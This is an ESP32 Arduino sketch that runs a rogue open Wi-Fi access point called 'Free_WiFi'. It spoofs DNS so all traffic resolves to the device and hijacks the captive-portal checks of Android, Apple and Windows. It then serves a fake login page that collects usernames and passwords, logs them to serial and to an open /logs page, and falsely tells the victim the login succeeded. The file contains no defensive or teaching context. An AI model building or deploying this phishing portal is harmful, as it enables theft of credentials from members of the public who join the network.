#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_event.h"

#define FLASH_LED_PIN 4

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String loginLogs = "";
const char* ssid = "Free_WiFi";
const char* password = "";

// Modern login HTML
String loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
    body {
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .login-box {
      background: rgba(255, 255, 255, 0.95);
      padding: 2rem;
      border-radius: 16px;
      width: 90%;
      max-width: 380px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.25);
    }
    .login-box h2 {
      margin-bottom: 1rem;
      color: #0072ff;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0072ff;
      color: white;
      border: none;
      font-weight: bold;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Free Wi-Fi Login</h2>
    <form method="POST" action="/login">
      <input type="text" name="username" placeholder="Email or Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

void IRAM_ATTR onClientConnected(void* arg, esp_event_base_t base, int32_t id, void* data) {
  digitalWrite(FLASH_LED_PIN, HIGH);
  delay(1000);
  digitalWrite(FLASH_LED_PIN, LOW);
}

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String user = server.arg("username");
    String pass = server.arg("password");
    String entry = "Username: " + user + " | Password: " + pass + "\n";
    loginLogs += entry;
    Serial.println(entry);
  }
  server.send(200, "text/html", "<script>alert('Login successful!'); window.location.href='/';</script>");
}

void handleLogs() {
  server.send(200, "text/plain", loginLogs);
}

void handleCaptive() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  pinMode(FLASH_LED_PIN, OUTPUT);
  digitalWrite(FLASH_LED_PIN, LOW);

  WiFi.softAP(ssid, password);
  delay(100);  // small delay to let AP start
  Serial.println("✅ AP Started: Free_WiFi");
  Serial.println(WiFi.softAPIP());

  // DNS spoofing: resolve all to ESP32
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logs", handleLogs);

  // Captive portal triggers
  server.on("/generate_204", handleCaptive);           // Android
  server.on("/hotspot-detect.html", handleCaptive);    // Apple
  server.on("/connecttest.txt", handleCaptive);        // Windows
  server.on("/wpad.dat", handleCaptive);
  server.on("/ncsi.txt", handleCaptive);
  server.on("/redirect", handleCaptive);
  server.onNotFound(handleCaptive);

  server.begin();

  esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_AP_STACONNECTED, &onClientConnected, NULL, NULL);
}

void loop() {
  dnsServer.processNextRequest();  // required for DNS spoofing
  server.handleClient();
}
